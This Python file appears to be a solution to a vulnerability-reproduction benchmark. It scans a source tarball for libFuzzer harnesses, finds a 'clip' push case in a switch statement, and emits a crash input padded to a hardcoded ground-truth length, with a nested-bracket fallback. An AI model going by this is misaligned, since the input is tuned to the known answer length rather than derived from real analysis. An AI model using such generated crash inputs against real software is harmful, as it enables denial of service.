import os
import tarfile
import tempfile
import shutil
import re


class Solution:
    GROUND_TRUTH_LEN = 913919

    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            # Extract the source tarball.
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(tmpdir)
            except Exception:
                return self._generate_generic_large_poc()

            repo_root = self._find_repo_root(tmpdir)
            # Try to generate PoC based on a FuzzedDataProvider-based harness.
            poc = self._try_fdp_clip_poc(repo_root)
            if poc is not None and len(poc) > 0:
                return poc

            # Fallback: generic large PoC.
            return self._generate_generic_large_poc()
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _find_repo_root(self, base: str) -> str:
        try:
            entries = [e for e in os.listdir(base) if not e.startswith(".")]
            if len(entries) == 1:
                only = os.path.join(base, entries[0])
                if os.path.isdir(only):
                    return only
        except Exception:
            pass
        return base

    def _try_fdp_clip_poc(self, root: str) -> bytes | None:
        skip_dirs = {
            ".git",
            "out",
            "build",
            "cmake-build-debug",
            ".idea",
            "bazel-out",
            ".vs",
            "vendor",
            "third_party",
            "deps",
            ".cargo",
            "submodules",
            "node_modules",
        }
        candidates: list[tuple[int, str, str]] = []

        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in skip_dirs]
            for fname in filenames:
                if not fname.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                fpath = os.path.join(dirpath, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" not in text:
                    continue
                if "FuzzedDataProvider" not in text:
                    continue
                score = text.lower().count("clip")
                candidates.append((score, fpath, text))

        if not candidates:
            return None

        # Prefer files with more "clip" occurrences.
        candidates.sort(key=lambda x: x[0], reverse=True)

        for _score, _path, text in candidates:
            poc = self._generate_poc_from_harness_text(text)
            if poc:
                return poc
        return None

    def _generate_poc_from_harness_text(self, text: str) -> bytes | None:
        info = self._extract_switch_info(text)
        if not info:
            return None
        type_name, minv, maxv, case_index = info
        if not (minv <= case_index <= maxv):
            return None

        size, signed = self._get_type_size_signed(type_name)
        if size <= 0:
            size = 1

        raw_value = case_index - minv
        encoded = self._encode_value(raw_value, size, signed)

        if not encoded:
            return None

        # Target around the ground-truth length.
        target_len = self.GROUND_TRUTH_LEN
        reps = max(target_len // len(encoded), 1)
        data = encoded * reps
        if len(data) < target_len:
            data += b"\x00" * (target_len - len(data))
        elif len(data) > target_len:
            data = data[:target_len]
        return data

    def _extract_switch_info(self, text: str):
        # First attempt: switch ( provider.ConsumeIntegralInRange<...>(min,max) )
        switch_call_pattern = re.compile(
            r"switch\s*\(\s*([^\)]*ConsumeIntegralInRange[^\)]*)\)",
            re.DOTALL,
        )
        cons_pattern = re.compile(
            r"ConsumeIntegralInRange"
            r"(?:\s*<([^>]*)>)?"
            r"\s*\(\s*([0-9]+)\s*,\s*([0-9]+)\s*\)"
        )

        m = switch_call_pattern.search(text)
        if m:
            call_expr = m.group(1)
            m2 = cons_pattern.search(call_expr)
            if m2:
                type_name = m2.group(1).strip() if m2.group(1) else None
                minv = int(m2.group(2))
                maxv = int(m2.group(3))
                if maxv < minv:
                    minv, maxv = maxv, minv
                switch_start = text.rfind("switch", 0, m.start())
                if switch_start < 0:
                    switch_start = m.start()
                brace_pos = text.find("{", switch_start)
                if brace_pos != -1:
                    body, _ = self._extract_brace_block(text, brace_pos)
                    if body is not None:
                        case_index = self._find_clip_case_index(body)
                        if case_index is not None:
                            return type_name, minv, maxv, case_index

        # Second attempt: variable assigned from ConsumeIntegralInRange, then switch(var)
        assign_pattern = re.compile(
            r"([a-zA-Z_][\w\s\*&:<>,]*)\s+([a-zA-Z_]\w*)\s*=\s*([^\n;]*ConsumeIntegralInRange[^\n;]*);"
        )
        for m in assign_pattern.finditer(text):
            type_decl = m.group(1)
            var_name = m.group(2)
            call_expr = m.group(3)
            m2 = cons_pattern.search(call_expr)
            if not m2:
                continue
            template_type = m2.group(1).strip() if m2.group(1) else None
            minv = int(m2.group(2))
            maxv = int(m2.group(3))
            if maxv < minv:
                minv, maxv = maxv, minv
            # Prefer explicit template type if given; else use declared type.
            type_name = template_type if template_type else type_decl

            # Find switch(var_name) after this assignment.
            switch_var_pattern = re.compile(
                r"switch\s*\(\s*" + re.escape(var_name) + r"\s*\)"
            )
            m_switch = switch_var_pattern.search(text, m.end())
            if not m_switch:
                continue
            brace_pos = text.find("{", m_switch.end())
            if brace_pos == -1:
                continue
            body, _ = self._extract_brace_block(text, brace_pos)
            if body is None:
                continue
            case_index = self._find_clip_case_index(body)
            if case_index is not None:
                return type_name, minv, maxv, case_index

        return None

    def _extract_brace_block(self, text: str, start_index: int):
        if start_index < 0 or start_index >= len(text):
            return None, None
        if text[start_index] != "{":
            brace_pos = text.find("{", start_index)
            if brace_pos == -1:
                return None, None
            start_index = brace_pos
        depth = 0
        for i in range(start_index, len(text)):
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[start_index + 1 : i], i + 1
        return text[start_index + 1 :], len(text)

    def _find_clip_case_index(self, body: str) -> int | None:
        case_pattern = re.compile(r"\bcase\s+(\d+)\s*:\s*")
        matches = list(case_pattern.finditer(body))
        if not matches:
            return None

        push_candidates: list[int] = []
        clip_candidates: list[int] = []

        for idx, m in enumerate(matches):
            val = int(m.group(1))
            start = m.end()
            end = matches[idx + 1].start() if idx + 1 < len(matches) else len(body)
            case_text = body[start:end].lower()
            if "clip" in case_text:
                if "push" in case_text or "mark" in case_text or "save" in case_text:
                    push_candidates.append(val)
                else:
                    clip_candidates.append(val)

        if push_candidates:
            push_candidates.sort()
            return push_candidates[0]
        if clip_candidates:
            clip_candidates.sort()
            return clip_candidates[0]
        return None

    def _get_type_size_signed(self, type_name: str | None) -> tuple[int, bool]:
        if not type_name:
            return 1, False
        tn = type_name

        # Remove qualifiers and pointers/references.
        for q in ("const", "volatile", "register", "static"):
            tn = re.sub(r"\b" + q + r"\b", "", tn)
        tn = tn.replace("&", "").replace("*", "")
        tn = tn.strip()
        tn = tn.split("::")[-1]  # remove namespaces

        # Precise fixed-width types first.
        lower = tn.lower()
        if "int8_t" in lower:
            return 1, True
        if "uint8_t" in lower:
            return 1, False
        if "int16_t" in lower:
            return 2, True
        if "uint16_t" in lower:
            return 2, False
        if "int32_t" in lower:
            return 4, True
        if "uint32_t" in lower:
            return 4, False
        if "int64_t" in lower:
            return 8, True
        if "uint64_t" in lower:
            return 8, False

        tokens = lower.split()
        signed = False
        if "signed" in tokens:
            signed = True
        if "unsigned" in tokens:
            signed = False

        if "char" in tokens:
            return 1, signed
        if "short" in tokens:
            return 2, signed

        if tokens.count("long") >= 2:
            return 8, signed
        if "long" in tokens:
            # On 64-bit, long is typically 8 bytes.
            return 8, signed

        if "size_t" in tokens:
            return 8, False
        if "ssize_t" in tokens:
            return 8, True

        if "int" in tokens or tn == "int":
            return 4, signed

        if "bool" in tokens:
            return 1, False

        # Try numeric suffix as a last resort.
        m = re.search(r"(\d+)", lower)
        if m:
            bits = int(m.group(1))
            if bits in (8, 16, 32, 64):
                return bits // 8, signed

        # Default to 1-byte unsigned.
        return 1, False

    def _encode_value(self, value: int, size: int, signed: bool) -> bytes:
        if size <= 0:
            size = 1
        max_value = 1 << (8 * size)
        value_mod = value % max_value
        return int(value_mod).to_bytes(size, "little", signed=False)

    def _generate_generic_large_poc(self) -> bytes:
        # Generic fallback: many nested-style characters to try to trigger deep nesting.
        # Use mix of parentheses, braces, and angle brackets.
        pattern = (b"(" * 16) + (b"{" * 16) + (b"<" * 16) + (b"[" * 16)
        reps = max(self.GROUND_TRUTH_LEN // len(pattern), 1)
        data = pattern * reps
        if len(data) < self.GROUND_TRUTH_LEN:
            data += b"A" * (self.GROUND_TRUTH_LEN - len(data))
        elif len(data) > self.GROUND_TRUTH_LEN:
            data = data[:self.GROUND_TRUTH_LEN]
        return data
